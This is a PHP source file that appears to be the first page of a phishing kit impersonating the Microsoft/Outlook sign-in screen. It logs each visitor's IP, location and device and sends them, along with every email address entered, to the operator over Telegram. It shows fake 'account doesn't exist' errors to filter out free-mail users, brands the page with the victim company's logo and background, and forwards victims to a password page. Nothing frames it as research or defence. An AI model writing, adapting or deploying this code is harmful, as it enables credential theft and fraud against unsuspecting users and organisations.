<?php
// index.php — Page 1: Email entry + domain asset pre-fetch
require 'config.php';
require 'helpers.php';
session_start();

// ── Block check: only run if visitor_id actually exists ──
if (!empty($_SESSION['visitor_id'])) {
    $__bs = get_state($_SESSION['visitor_id']);
    if (!empty($__bs['blocked'])) {
        header('Location: blocked.php');
        exit;
    }
}

// ── Generate visitor ID if new ──
if (empty($_SESSION['visitor_id'])) {
    $_SESSION['visitor_id'] = bin2hex(random_bytes(16));
    unset($_SESSION['tg_notified']);
}

$sid    = $_SESSION['visitor_id'];
$ua     = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
$device = detect_device($ua);

// ── Telegram new visitor notification ──
if (empty($_SESSION['tg_notified'])) {
    set_state($sid, [
        'page'           => 'email',
        'ip'             => $_SERVER['REMOTE_ADDR'] ?? '?',
        'device_os'      => $device['os'],
        'device_browser' => $device['browser'],
        'device_type'    => $device['type'],
        'device_ua'      => $ua,
        'created'        => date('H:i:s d/m/Y'),
    ]);

    $location = get_visitor_location($_SERVER['REMOTE_ADDR'] ?? '');

    tg_send(
        "🟦 <b>NEW OUTLOOK VISITOR</b>\n\n" .
        "🆔 ID: <code>{$sid}</code>\n" .
        "📍 <b>{$location}</b>\n" .
        "🌐 IP: <code>" . ($_SERVER['REMOTE_ADDR'] ?? '?') . "</code>\n" .
        "📱 Device: {$device['type']}\n" .
        "💻 OS: {$device['os']}\n" .
        "🌍 Browser: {$device['browser']}\n" .
        "⏰ Time: " . date('H:i:s d/m/Y') . "\n\n" .
        "⏳ Waiting for email..."
    );

    $_SESSION['tg_notified'] = true;
}

// ── Blocked consumer/free email domains ──
// Microsoft consumer domains (hotmail, outlook, live, msn) ARE allowed
// All other free providers are blocked
$blocked_domains = [
    'gmail.com','googlemail.com',
    'yahoo.com','ymail.com','yahoo.co.uk','yahoo.fr','yahoo.de','yahoo.es','yahoo.it',
    'aol.com','aol.co.uk',
    'icloud.com','me.com','mac.com',
    'protonmail.com','proton.me','pm.me',
    'mail.com','zoho.com','gmx.com','gmx.net','gmx.de',
    'yandex.com','yandex.ru',
    'tutanota.com','tutanota.de',
    'fastmail.com','fastmail.fm',
    'mail.ru','inbox.ru','list.ru','bk.ru',
    'web.de','freenet.de','t-online.de',
    'libero.it','virgilio.it',
    'wanadoo.fr','laposte.net','free.fr','sfr.fr','orange.fr',
];

$error = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = trim($_POST['email'] ?? '');
    if ($email === '') {
        $error = 'Enter an email address.';
    } elseif (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
        $error = "That Microsoft account doesn't exist. Enter a different account or get a new one.";
    } else {
        $domain = strtolower(trim(explode('@', $email)[1] ?? ''));

        // Block free/consumer email providers (but allow Microsoft consumer domains)
        if (in_array($domain, $blocked_domains)) {
            $error = "That Microsoft account doesn't exist. Enter a different account or get a new one.";
        } else {
            $_SESSION['email'] = $email;

            // ── Pre-fetch domain assets server-side ──
            if ($domain) {
                $no_bg = get_no_bg_domains();

                $logo_url = 'https://logo.clearbit.com/' . $domain;
                $ch = curl_init($logo_url);
                curl_setopt_array($ch, [
                    CURLOPT_NOBODY         => true,
                    CURLOPT_RETURNTRANSFER => true,
                    CURLOPT_TIMEOUT        => 4,
                    CURLOPT_SSL_VERIFYPEER => false,
                    CURLOPT_FOLLOWLOCATION => true,
                    CURLOPT_USERAGENT      => 'Mozilla/5.0',
                ]);
                curl_exec($ch);
                $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                curl_close($ch);

                $_SESSION['domain']      = $domain;
                $_SESSION['domain_name'] = ucfirst(explode('.', $domain)[0]);
                $_SESSION['domain_logo'] = ($code === 200)
                    ? $logo_url
                    : 'https://www.google.com/s2/favicons?domain=' . $domain . '&sz=128';

                $_SESSION['domain_bg'] = !in_array($domain, $no_bg)
                    ? screenshot_url($domain)
                    : '';
            }

            set_state($sid, ['page' => 'password', 'email' => $email]);
            tg_send(
                "📧 <b>EMAIL ENTERED</b>\n" .
                "🆔 ID: <code>{$sid}</code>\n" .
                "📨 Email: <code>{$email}</code>\n" .

                "➡️ Moving to password page..."
            );
            header('Location: password.php');
            exit;
        }
    }
}

// ── Index ALWAYS uses default MS background ──
unset($_SESSION['domain_bg']);
$_SESSION['domain_bg'] = '';

page_open('Sign in to your Microsoft account', false, true);
?>

<div class="card">
  <?= ms_logo() ?>
  <h1 class="card-title">Sign in</h1>

  <form method="POST" id="emailForm" novalidate>
    <div class="ms-field">
      <input type="text" name="email" id="emailInput"
             placeholder="Email, phone, or Skype"
             value="<?= htmlspecialchars($_POST['email'] ?? '') ?>"
             class="<?= $error ? 'err' : '' ?>"
             autocomplete="email" inputmode="email" />
    </div>

    <?php if ($error): ?>
      <div class="err-text"><?= err_icon() ?> <?= htmlspecialchars($error) ?></div>
    <?php else: ?>
      <div class="err-text" id="emailErr"></div>
    <?php endif; ?>

    <p style="font-size:13px;color:#1b1b1b;margin-top:8px">
      No account? <a href="#" class="ms-link" style="margin:0">Create one!</a>
    </p>
    <a href="#" class="ms-link" style="display:block;margin-top:10px">Can't access your account?</a>

    <div class="btn-row-ms">
      <button type="submit" class="btn-ms">Next</button>
    </div>
  </form>
</div>

<div class="card-options">
  <button class="options-row">
    <div class="options-icon">
      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#444" stroke-width="1.5">
        <circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/>
      </svg>
    </div>
    <span>Sign-in options</span>
  </button>
</div>

<?php page_close(); ?>